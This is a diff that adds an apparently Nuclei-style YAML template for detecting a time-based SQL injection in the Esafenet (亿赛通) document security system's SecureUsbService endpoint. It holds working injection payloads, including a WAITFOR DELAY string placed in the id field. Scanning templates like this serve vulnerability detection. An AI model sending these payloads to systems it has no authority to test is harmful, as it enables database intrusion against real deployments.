@@ -1,0 +1,57 @@
+id: poc-yaml-yisaitong-esafenet-secureusbservice-sqli
+info:
+  name: 亿赛通电子文档安全管理系统 SecureUsbService SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(5, 10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        POST /CDGServer3/device/SecureUsbService;login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        command=DelSecureUsb&id='
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+      - type: word
+        part: header
+        words:
+          - "CDGServer3"
+      - type: word
+        part: body
+        words:
+          - ""
+
+  - raw:
+      - |
+        POST /CDGServer3/device/SecureUsbService;login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        command=DelSecureUsb&id=a';WAITFOR+DELAY+'0:0:{{t1}}'--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 404
+      - type: word
+        part: header
+        words:
+          - "CDGServer3"
+      - type: word
+        part: body
+        words:
+          - "Freedom LiFe"
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
